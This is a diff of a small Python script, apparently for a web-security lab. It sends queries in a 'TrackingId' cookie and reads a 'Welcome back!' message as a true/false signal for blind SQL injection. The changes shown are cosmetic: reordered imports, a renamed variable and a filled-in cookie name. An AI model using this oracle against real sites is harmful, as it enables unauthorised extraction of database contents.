@@ -1,6 +1,8 @@
-import requests, sys
-from bs4 import BeautifulSoup
 import urllib.parse
+
+import requests
+import sys
+from bs4 import BeautifulSoup
 
 site = sys.argv[1]
 if 'https://' in site:
@@ -11,8 +13,8 @@ url = f'https://{site}/'
 
 def try_query(query):
     print(f'Query: {query}')
-    mycookies = {'<FMI>': urllib.parse.quote_plus(query)}
-    resp = requests.get(url, cookies=mycookies)
+    my_cookies = {'TrackingId': urllib.parse.quote_plus(query)}
+    resp = requests.get(url, cookies=my_cookies)
     soup = BeautifulSoup(resp.text, 'html.parser')
     if soup.find('div', text='Welcome back!'):
         return True
